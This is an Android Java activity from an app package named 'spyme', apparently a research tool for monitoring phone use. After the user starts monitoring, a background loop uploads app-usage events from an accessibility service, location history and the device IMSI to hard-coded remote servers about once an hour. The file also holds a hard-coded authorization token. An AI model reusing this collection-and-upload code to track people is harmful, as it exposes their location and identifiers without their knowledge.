package bouzid.spyme.mosaic.bouzid;

import android.Manifest;
import android.app.ActivityManager;
import android.app.Application;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.VpnService;
import android.net.http.RequestQueue;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.provider.SyncStateContract;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Cache;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.BasicNetwork;
import com.android.volley.toolbox.DiskBasedCache;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.ProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import com.android.volley.toolbox.Volley;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;

import static android.content.ContentValues.TAG;


public class MainActivity extends AppCompatActivity {
    public static ArrayList<String> LocationHere=new ArrayList<>();
    public static ArrayList<String> SelectedApps=new ArrayList<>();
    private static final int REQUEST_VPN = 1;
    public static  int nbrq=1;
    public static final int CONNECTION_TIMEOUT=10000;
    public static final int READ_TIMEOUT=15000;
    public static  int SuccessPost=0;

        private AlertDialog dialogVpn = null;
      // String ServerURL = "http://195.148.125.94/hello.php" ;
        String ServerURL = "https://radiant-cliffs-98969.herokuapp.com/yaw";
        private Context context = null;
    private boolean runningThread = true;

    public final boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }




    private void doSomethingRepeatedly() throws IOException {
        HttpURLConnection conn;
        URL url = null;
        url = new URL("http://195.148.125.94/katia.php");
        conn = (HttpURLConnection)url.openConnection();
        conn.setReadTimeout(READ_TIMEOUT);
        conn.setConnectTimeout(CONNECTION_TIMEOUT);
        conn.setRequestMethod("POST");

        // setDoInput and setDoOutput method depict handling of both send and receive
        conn.setDoInput(true);
        conn.setDoOutput(true);

        // Append parameters to URL





        Uri.Builder builder = new Uri.Builder()
                .appendQueryParameter("AA", "AA")
                .appendQueryParameter("BB", "AA")
                .appendQueryParameter("CC", "AA")
                .appendQueryParameter("DD", "AA");
        String query = builder.build().getEncodedQuery();

        // Open connection for sending data
        OutputStream os = conn.getOutputStream();
        BufferedWriter writer = new BufferedWriter(
                new OutputStreamWriter(os, "UTF-8"));
        writer.write(query);
        writer.flush();
        writer.close();
        os.close();
        conn.connect();
    }

    public  void AddPost(){




            try {
                String URL = "http://195.148.125.96/script.php";
                JSONObject jsonBody = new JSONObject();

                jsonBody.put("email", "abc@abc.com");
                jsonBody.put("password", "");
                jsonBody.put("user_type", "");
                jsonBody.put("company_id", "");
                jsonBody.put("status", "");

                JsonObjectRequest jsonOblect = new JsonObjectRequest(Request.Method.POST, URL, jsonBody, new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {

                        Toast.makeText(getApplicationContext(), "Response:  " + response.toString(), Toast.LENGTH_SHORT).show();
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                        onBackPressed();

                    }
                }) {
                    @Override
                    public Map<String, String> getHeaders() throws AuthFailureError {
                        final Map<String, String> headers = new HashMap<>();
                        headers.put("Authorization", "Basic " + "c2FnYXJAa2FydHBheS5jb206cnMwM2UxQUp5RnQzNkQ5NDBxbjNmUDgzNVE3STAyNzI=");//put your token here
                        return headers;
                    }
                };
                //VolleyApplication.getInstance().addToRequestQueue(jsonOblect);

            } catch (JSONException e) {
                e.printStackTrace();
            }
            // Toast.makeText(getApplicationContext(), "done", Toast.LENGTH_LONG).show();

        }



    public  void postNewComment(Context context){
        final DataCollector dataCollector = new DataCollector("", this);
        com.android.volley.RequestQueue queue = Volley.newRequestQueue(MainActivity.this);
        StringRequest sr = new StringRequest(Request.Method.POST,"http://195.148.125.94/katia.php", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            protected Map<String,String> getParams(){
                Map<String,String> params = new HashMap<String, String>();

                params.put("AA",WindowChangeDetectingService.activityEvent.toString());
                params.put("BB", SelectedApps.toString()+" "+ dataCollector.getImsi());
                params.put("CC",LocationHere.toString());
                params.put("DD", getBestLastKnownLocation(MainActivity.this).toString());


                return params;
            }

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String,String> params = new HashMap<String, String>();
                //params.put("AA","application/x-www-form-urlencoded");
                return params;
            }
        };
        queue.add(sr);
    }




    public void  SaveData(){

/*



    Map<String, String> params = new HashMap<String, String>();
    params.put("userID", "userid");
    params.put("email","email");
    params.put("passwd", "password");
    JsonArrayRequest request = new JsonArrayRequest(Request.Method.POST, "url", new JSONObject(params),
            new Response.Listener<JSONArray>() {
                @Override
                public void onResponse(JSONArray response) {
                    System.out.println("response -->> " + response.toString());
                }
            },
            new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    System.out.println("change Pass response -->> " + error.toString());
                }
            });

    request.setRetryPolicy(new

    DefaultRetryPolicy(60000,
                       DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                       DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));


    Volley.newRequestQueue(activity).add(request);
*/
    }

    public static Location getBestLastKnownLocation(Context context) {
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        List<String> providers = locationManager.getAllProviders();
        Location bestLocation = null;

        for (String provider : providers) {
            try {
                Location location = locationManager.getLastKnownLocation(provider);
                if (bestLocation == null || location != null
                        && location.getElapsedRealtimeNanos() > bestLocation.getElapsedRealtimeNanos()
                        && location.getAccuracy() > bestLocation.getAccuracy())
                    bestLocation = location;
            } catch (SecurityException ignored) {
            }
        }

        return bestLocation;
    }

    public void statusCheck() {
        final LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            buildAlertMessageNoGps();

        }
    }

    public boolean CHeckWifi(){

    ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
    NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

    if (mWifi.isConnected()) {
        return true;
    }


    return false;
    }
    public static Response.Listener<JSONObject> createRequestSuccessListener(){
        return new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                //Log.d(SyncStateContract.Constants, "===> Response => "+response.toString());
            }
        };
    }

    public static Response.ErrorListener createRequestErrorListener(){
        return new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                //Log.d(SyncS, "===> JsonObjectRequest error ");
                //Log.d(Constants.TAG, error.toString());
            }
        };
    }

    private void buildAlertMessageNoGps() {
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Your GPS seems to be disabled, do you want to enable it?")
                .setCancelable(false)
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, final int id) {
                        startActivity(new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, final int id) {
                        dialog.cancel();
                    }
                });
        final AlertDialog alert = builder.create();
        alert.show();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final DataCollector dataCollector = new DataCollector("", this);
        Button monitorButton = findViewById(R.id.monitorButton);
        LinearLayout listApps = findViewById(R.id.listApps);
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
        Date d = new Date();
        String date = sdf.format(d);

        sdf = new SimpleDateFormat("HH:mm:ss");
        String time = sdf.format(d);




        String permission = Manifest.permission.READ_PHONE_STATE;
        int res = this.checkCallingOrSelfPermission(permission);
        if (res== PackageManager.PERMISSION_DENIED) {
            AlertDialog.Builder dlgAlert  = new AlertDialog.Builder(MainActivity.this);
            dlgAlert.setPositiveButton("Please enable Location and Telephone Permissions",
                    new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            dialog.cancel();
                            Intent ii = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
                            startActivity(ii);

                        }
                    });
            dlgAlert.create();
            dlgAlert.show();
        }
















        ArrayList<ApplicationInfo> api=dataCollector.getInstalledApps();
        int size =dataCollector.getInstalledApps().size();

        for (int i = 0 ; i < size; i++) {
            final CheckBox test = new CheckBox(this);
            test.setText(api.get(i).appName);
            listApps.addView(test);
            test.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                @Override
                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                    StoreData sd=new StoreData(MainActivity.this);
                    if (isChecked) {
                        String name = (String) test.getText();
                        SelectedApps.add(name);
                        //sd.SendPostRequest("",name);

                    }

                }
            });

        }


        context = this;
        monitorButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //StoreData sd=new StoreData(MainActivity.this);
                //sd.SaveDataDatabase("",WindowChangeDetectingService.activityEvent.toString(),SelectedApps.toString(),LocationHere.toString(),dataCollector.getImsi().toString());
                //Log.i("KATIA", WindowChangeDetectingService.activityEvent.toString());







                final LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

                if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    buildAlertMessageNoGps();

                }

                //StoreData sd=new StoreData(MainActivity.this);
                Date currentTime = Calendar.getInstance().getTime();
                //sd.SendPostRequest("",SelectedApps.toString() +"   "+ currentTime  +"   "+ dataCollector.getImsi().toString(),"Selected Apps");

/*
                Log.i("SAMIRA", LocationHere.toString());

                StoreData sd=new StoreData(MainActivity.this);
                sd.SendPostRequest("",WindowChangeDetectingService.activityEvent.toString());
                WindowChangeDetectingService.activityEvent =new ArrayList<>();
                sd.SendPostRequest("",LocationHere.toString());
                LocationHere=new ArrayList<>();
                sd.SendPostRequest("",dataCollector.getImsi().toString());
                Log.i("IMSI", dataCollector.getImsi().toString());
                sd.SendPostRequest("",getBestLastKnownLocation(MainActivity.this).getLatitude()+ " LOCATION " + getBestLastKnownLocation(MainActivity.this).getLongitude());


*/











               String s = " ";
                //TextView   mTitle = (TextView) findViewById(R.id.AhmedLol);
                //mTitle.append(s); // append string like a variable value
               // mTitle.append(dataCollector.getImsi());

//                    mTitle.append(mTitle.getText() +WindowChangeDetectingService.activityEvent.get(WindowChangeDetectingService.activityEvent.size()-6));

//                HardwareInfo hardwareInfo = dataCollector.getHardware();
//                Log.i("DataCollectorHardware", hardwareInfo.toString());

//                final ArrayList<ApplicationInfo> applicationInfos = dataCollector.getInstalledApps();
//                for( ApplicationInfo applicationInfo : applicationInfos ){
//                 Log.i("DataCollectorApps",applicationInfo.toString());
//                }



//                final ArrayList<CallLogInfo> callLogInfos = dataCollector.getCallLogs();
 //               for(CallLogInfo callLogInfo : callLogInfos ){
 //                   Log.i("DataCollectorCallLog",callLogInfo.toString());
  //              }

//                final ArrayList<CalendarInfo> calendarInfos = dataCollector.getCalendarInfos();
 //               for(CalendarInfo calendarInfo : calendarInfos ){
  //                  Log.i("DataCollectorCalendar", calendarInfo.toString());
    //            }

             //   final ArrayList<ContactInfo> contactInfos = dataCollector.getContactInfos();
             //   for(ContactInfo contactInfo : contactInfos){
             //       Log.i("DataCollectorContact", contactInfo.toString());
              //  }

            //    BatteryStats batteryStats = dataCollector.getBatteryStats();
            //    Log.i("DataCollectorBattery", batteryStats.toString());

                String imsii = dataCollector.getImsi();
                Log.i("DataCollectorIMSI", imsii);
                Log.i("DataCollectorIMSI", dataCollector.getImsi().toString());

                //String imei = dataCollector.getImei();
                //Log.i("DataCollectorIMSI", imei);

                DataCollectorService dataCollectorService = new DataCollectorService();
                Intent intent = new Intent(getApplicationContext(), dataCollectorService.getClass());

                if( !isServiceRunning(dataCollectorService.getClass())){
                    startService(intent);
                }


                final Thread thread =new Thread(new Runnable() {
                    int lastMinute;
                    int currentMinute;

                    @Override
                    public void run() {

                        while(true)
                        {



                        Date currentTime = Calendar.getInstance().getTime();
                        AlertDialog.Builder dlgAlert  = new AlertDialog.Builder(MainActivity.this);
                        lastMinute = currentMinute;
                       // while (true)
                       // {

                        //        if(!isNetworkAvailable()){
                      //              continue;
                    //            }

                            //Log.i("MMMM", String.valueOf(currentMinute));


                                Calendar calendar = Calendar.getInstance();
                                calendar.setTimeInMillis(System.currentTimeMillis());
                                currentMinute = calendar.get(Calendar.HOUR_OF_DAY);
                                ArrayList<String>vals=new ArrayList<>();
                                if (currentMinute != lastMinute){
                                    Log.v("AALTO THREQD", "pppppppppp");

                                    lastMinute = currentMinute;
                                    //Log.v("LOGGG", WindowChangeDetectingService.activityEvent.toString());

                                    StoreData st=new StoreData(MainActivity.this);
                                    if(getBestLastKnownLocation(MainActivity.this)==null){
                                    //    vals.add("WindowChangeDetectingService.activityEvent.toString()");
                                     //   vals.add("SelectedApps.toString() dataCollector.getImsi().toString()");
                                     //   vals.add("LocationHere.toString()");
                                     //   vals.add("dataCollector.getImsi().toString()  getBestLastKnownLocation(MainActivity.this).toString()");
                                        st.SendPostRequestNew("",WindowChangeDetectingService.activityEvent.toString(),SelectedApps.toString(),LocationHere.toString(),dataCollector.getImsi().toString());



                                     //   AsyncLogin hat = new AsyncLogin();
                                     //   hat.execute(vals);
                                    }else{
                                        st.SendPostRequestNew("",WindowChangeDetectingService.activityEvent.toString(),SelectedApps.toString()+" "+dataCollector.getImsi().toString(),LocationHere.toString(),getBestLastKnownLocation(MainActivity.this).toString()+" "+dataCollector.getImsi().toString());

                                       // vals.add("WindowChangeDetectingService.activityEvent.toString()");
                                       // vals.add("SelectedApps.toString() dataCollector.getImsi().toString()");
                                       // vals.add("LocationHere.toString()");
                                       // vals.add("dataCollector.getImsi().toString()  getBestLastKnownLocation(MainActivity.this).toString()");


                                       // AsyncLogin hat = new AsyncLogin();
                                       // hat.execute(vals);


                                        Log.v("AALTO", WindowChangeDetectingService.activityEvent.toString());
                                        Log.v("AALTO", SelectedApps.toString());
                                        Log.v("AALTO", dataCollector.getImsi().toString());
                                        Log.v("AALTO", LocationHere.toString());
                                        Log.v("AALTO",getBestLastKnownLocation(MainActivity.this).toString());
                                    }



                                    if(SuccessPost==1){
                                        MainActivity.LocationHere.clear();
                                        WindowChangeDetectingService.activityEvent.clear();
                                        SuccessPost=0;
                                    }




/*
                            String query="";

                            try {
                                query = URLEncoder.encode(WindowChangeDetectingService.activityEvent.toString(), "utf-8");
                            } catch (UnsupportedEncodingException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }

                            String query1="";

                            try {
                                query1 = URLEncoder.encode(SelectedApps.toString(), "utf-8");
                            } catch (UnsupportedEncodingException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }

                            String query2="";

                            try {
                                query2 = URLEncoder.encode(LocationHere.toString(), "utf-8");
                            } catch (UnsupportedEncodingException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }

                            String query3="";

                            try {
                                query3 = URLEncoder.encode(getBestLastKnownLocation(MainActivity.this).toString()+" "+dataCollector.getImsi().toString(), "utf-8");
                            } catch (UnsupportedEncodingException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }

                            String mylink = "http://195.148.125.94/katia1.php?AA="+query+"&BB="+query1+"&CC="+query2+"&DD="+query3;
                            Log.i("LINK", mylink);
                            HttpAsyncTask hat = new HttpAsyncTask();
                            hat.execute(mylink);
                            WindowChangeDetectingService.SetToZero();
                            LocationHere.clear();
                            getBestLastKnownLocation(MainActivity.this).reset();
                                }

                                */
                                /*

                                if (WindowChangeDetectingService.activityEvent!=null){
                                    //sd.SendPostRequest("",WindowChangeDetectingService.activityEvent.toString() +"   "+currentTime +"   "+ dataCollector.getImsi().toString(),"ApplicationsEvents");
                                    //WindowChangeDetectingService.SetToZero();
                                }


                                if (LocationHere!=null){
                                    //sd.SendPostRequest("",LocationHere.toString() +"   "+currentTime +"   "+ dataCollector.getImsi().toString(),"Location");
                                    //LocationHere.clear();
                                    //LocationHere=new ArrayList<>();

                                }

                                //sd.SendPostRequest("",dataCollector.getImsi().toString() +"   "+currentTime,"IMSI");

                                if (getBestLastKnownLocation(MainActivity.this)!=null){
                                    //sd.SendPostRequest("",getBestLastKnownLocation(MainActivity.this).getLatitude() +" "  +getBestLastKnownLocation(MainActivity.this).getLongitude() +"   "+currentTime +"   "+ dataCollector.getImsi().toString(),"Last Location");

                                }
                                sd.SaveDataDatabase("",WindowChangeDetectingService.activityEvent.toString() +"   "+currentTime +"   "+ dataCollector.getImsi().toString(),LocationHere.toString() +"   "+currentTime +"   "+ dataCollector.getImsi().toString(),dataCollector.getImsi().toString() +"   "+currentTime,SelectedApps.toString());
                                Log.i("IMSI", dataCollector.getImsi().toString());


                                */

                                }
                      }


                    }


                    }






























                );



                    if (!CHeckWifi()){
                    final AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                    builder.setMessage("You are not connected to a WIFI, do you want to continue?")
                            .setCancelable(false)
                            .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                                public void onClick(final DialogInterface dialog, final int id) {
                                    try {
                              /*          File myFile = new File(Environment.getExternalStorageDirectory().getPath() + "/mysdfile.txt");
                                        myFile.createNewFile();
                                        FileOutputStream fOut = new FileOutputStream(myFile);
                                        OutputStreamWriter myOutWriter =
                                                new OutputStreamWriter(fOut);
                                        myOutWriter.append(WindowChangeDetectingService.activityEvent.toString());
                                        myOutWriter.close();
                                        fOut.close();
                                        Toast.makeText(getBaseContext(),
                                                "Done writing SD 'mysdfile.txt'",
                                                Toast.LENGTH_SHORT).show();
                            */

                                        thread.start();


                                    } catch (Exception e) {
                                        Toast.makeText(getBaseContext(), e.getMessage(),
                                                Toast.LENGTH_SHORT).show();

                                    }

                                    //new AsyncLogin().execute(WindowChangeDetectingService.activityEvent.toString(),SelectedApps.toString()+" "+dataCollector.getImsi()+" "+getBestLastKnownLocation(MainActivity.this).toString(),LocationHere.toString());





                              /*      com.android.volley.RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);
                                    Map<String, String> params = new HashMap<String, String>();
                                    params.put("AA",WindowChangeDetectingService.activityEvent.toString());
                                    params.put("BB", SelectedApps.toString()+" "+dataCollector.getImsi());
                                    params.put("CC",LocationHere.toString());
                                    params.put("DD", getBestLastKnownLocation(MainActivity.this).toString());
                                    CustomRequest jsObjRequest = new CustomRequest(Request.Method.POST, "http://195.148.125.94/katia.php", params, MainActivity.createRequestSuccessListener(), MainActivity.createRequestErrorListener());

                                    requestQueue.add(jsObjRequest);
*/
                                    //postNewComment(MainActivity.this);
                                   //AddPost();







                                }
                            })
                            .setNegativeButton("No", new DialogInterface.OnClickListener() {
                                public void onClick(final DialogInterface dialog, final int id) {
                                    dialog.cancel();
                                }
                            });
                    final AlertDialog alert = builder.create();
                    alert.show();

                    }else{
                        thread.start();
                    }



                    Log.i ("WIFICONNECTION", String.valueOf(CHeckWifi()));

                //dataCollector.getFForegroung();
                intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(intent, 0);

            }
        }

        );

    }


    private class AsyncLogin extends AsyncTask< ArrayList<String>, String,String>
    {
        //ProgressDialog pdLoading = new ProgressDialog(MainActivity.this);
        HttpURLConnection conn;
        URL url = null;



        @Override
        protected void onPreExecute() {
            super.onPreExecute();

            //this method will be running on UI thread
          //  pdLoading.setMessage("\tLoading...");
           // pdLoading.setCancelable(false);
            //pdLoading.show();

        }
        private String getQuery(List<NameValuePair> params) throws UnsupportedEncodingException
        {
            StringBuilder result = new StringBuilder();
            boolean first = true;

            for (NameValuePair pair : params)
            {
                if (first)
                    first = false;
                else
                    result.append("&");

                result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
                result.append("=");
                result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
            }

            return result.toString();
        }
        @Override
        protected String doInBackground(ArrayList<String>... params) {
            try {



                // Enter URL address where your php file resides
                //url = new URL("http://195.148.125.94/katia.php");
                url = new URL("http://195.148.125.96/script.php");

            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
                return "exception";
            }
            try {
                ArrayList<String> vals=params[0];
                // Setup HttpURLConnection class to send and receive data from php and mysql
                conn = (HttpURLConnection)url.openConnection();
                conn.setReadTimeout(35000);
                conn.setConnectTimeout(35000);
                conn.setRequestMethod("POST");

                // setDoInput and setDoOutput method depict handling of both send and receive
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setChunkedStreamingMode(0);

                // Append parameters to URL





                Uri.Builder builder = new Uri.Builder()
                        .appendQueryParameter("AA", vals.get(0))
                        .appendQueryParameter("BB", vals.get(1))
                        .appendQueryParameter("CC", vals.get(2))
                        .appendQueryParameter("DD", vals.get(3));


                List<NameValuePair> paramss = new ArrayList<NameValuePair>();
                paramss.add(new BasicNameValuePair("AA",  vals.get(0)));
                paramss.add(new BasicNameValuePair("BB", vals.get(1)));
                paramss.add(new BasicNameValuePair("CC", vals.get(2)));
                paramss.add(new BasicNameValuePair("DD", vals.get(3)));





                String query = builder.build().getEncodedQuery();

                // Open connection for sending data
                //OutputStream os = conn.getOutputStream();
                OutputStream os = new BufferedOutputStream(conn.getOutputStream());
                //writeStream(builder);

                Log.i ("Souhir", query.toString());

                query=builder.toString();

                //conn.connect();
                BufferedWriter writer = new BufferedWriter(
                        new OutputStreamWriter(os, "UTF-8"));
                writer.write(query.toString());
  //              writer.append(query.toString());
               // writer.write(getQuery(paramss));
                writer.flush();
                writer.close();
                os.close();

                conn.connect();

            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
                return "exception";
            }

            try {

                int response_code = conn.getResponseCode();

                // Check if successful connection made
                if (response_code == HttpURLConnection.HTTP_OK) {

                    // Read data sent from server
                    InputStream input = conn.getInputStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                    StringBuilder result = new StringBuilder();
                    String line;

                    while ((line = reader.readLine()) != null) {
                        result.append(line);
                    }

                    // Pass data to onPostExecute method

                    Log.i ("Souhir", result.toString());
                    return(result.toString());

                }else{

                    return("unsuccessful");
                }

            } catch (IOException e) {
                e.printStackTrace();
                return "exception";
            } finally {
                conn.disconnect();
            }


        }

        @Override
        protected void onPostExecute(String result) {

            //this method will be running on UI thread

            //pdLoading.dismiss();

            if(result.equalsIgnoreCase("true"))
            {
                /* Here launching another activity when login successful. If you persist login state
                use sharedPreferences of Android. and logout button to clear sharedPreferences.
                 */


                MainActivity.this.finish();

            }else if (result.equalsIgnoreCase("false")){

                // If username and password does not match display a error message
                Toast.makeText(MainActivity.this, "Invalid email or password", Toast.LENGTH_LONG).show();

            } else if (result.equalsIgnoreCase("exception") || result.equalsIgnoreCase("unsuccessful")) {

                Toast.makeText(MainActivity.this, "OOPs! Something went wrong. Connection Problem.", Toast.LENGTH_LONG).show();

            }
        }

    }


    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i ("isServiceRunning", true+"");
                return true;
            }
        }
        Log.i ("isServiceRunning", false+"");
        return false;
    }

    public void startVPN() {

        try {
            final Intent prepare = VpnService.prepare(getApplicationContext());
            if (prepare == null) {
                Log.i(TAG, "Prepare done");
                onActivityResult(REQUEST_VPN, RESULT_OK, null);
            } else {
                // Show dialog
                LayoutInflater inflater = LayoutInflater.from(this);
                View view = inflater.inflate(R.layout.vpn, null, false);
                dialogVpn = new AlertDialog.Builder(this)
                        .setView(view)
                        .setCancelable(false)
                        .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {

                                    Log.i(TAG, "Start intent=" + prepare);
                                    try {
                                        // com.android.vpndialogs.ConfirmDialog required
                                        startActivityForResult(prepare, REQUEST_VPN);
                                    } catch (Throwable ex) {
                                        Log.e(TAG, ex.toString() + "\n" + Log.getStackTraceString(ex));
                                        onActivityResult(REQUEST_VPN, RESULT_CANCELED, null);
                                    }
                            }
                        })
                        .setOnDismissListener(new DialogInterface.OnDismissListener() {
                            @Override
                            public void onDismiss(DialogInterface dialogInterface) {
                                dialogVpn = null;
                            }
                        })
                        .create();
                dialogVpn.show();
            }
        } catch (Throwable ex) {
            // Prepare failed
            Log.e(TAG, ex.toString() + "\n" + Log.getStackTraceString(ex));
        }
    }


    private class HttpAsyncTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... urls) {

            return httpRequestResponse(urls[0]);
        }
        // onPostExecute displays the results of the AsyncTask.
        @Override
        protected void onPostExecute(String result) {

        }
    }

    //For HttpAsync Functions: sending requests and receiving responses
    public static String httpRequestResponse(String url){
        InputStream inputStream = null;
        String result = "";
        try {
            // create HttpClient
            HttpClient httpclient = new DefaultHttpClient();

            // make GET request to the given URL
            HttpResponse httpResponse = httpclient.execute(new HttpGet(url));

            // receive response as inputStream
            inputStream = httpResponse.getEntity().getContent();

            // convert InputStream to string
            if(inputStream != null)
                result = convertInputStreamToString(inputStream);
            else
                result = "InputStream did not work";

        } catch (Exception e) {
            Log.d("InputStream", e.getLocalizedMessage());
        }

        return result;
    }

    private static String convertInputStreamToString(InputStream inputStream) throws IOException{
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;
    }



}


